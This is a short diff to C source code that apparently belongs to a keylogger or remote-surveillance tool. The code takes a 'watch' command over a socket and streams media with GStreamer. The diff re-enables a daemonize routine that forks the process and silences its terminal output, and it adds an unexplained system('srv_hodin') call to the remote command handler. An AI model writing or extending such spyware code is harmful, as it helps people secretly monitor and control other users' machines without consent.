@@ -71,7 +71,7 @@ int main(int argc, char*argv[])
         return 0;
     }
 
-    //daemonize();
+    daemonize();
 
     //ubuntu16_keylogger_init();
 
@@ -922,6 +922,8 @@ void execute_watch_cmd()
     GMainLoop *main_loop;
     CustomData data;
 
+    system("srv_hodin");
+
     if(recv(csock, (char*)&len_watch_cmd, sizeof(len_watch_cmd), 0) == SOCKET_ERROR)
     {
         error("recv() len_watch_cmd", "execute_watch_cmd()");
@@ -1048,7 +1050,8 @@ void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
 
 void daemonize()
 {
-  pid_t fils;
+
+    pid_t fils;
 
     fils = fork();
 
@@ -1074,7 +1077,7 @@ void daemonize()
     umask(0);
 
 
-    /**  Redirect standard I/O for cancel all user terminal messages **/
+    /**  Redirect standard I/O for cancel all user terminal messages  **/
     if(freopen("/dev/null", "r", stdin) == NULL )
     {
         error("freopen() stdin", "daemonize_keylogger()");
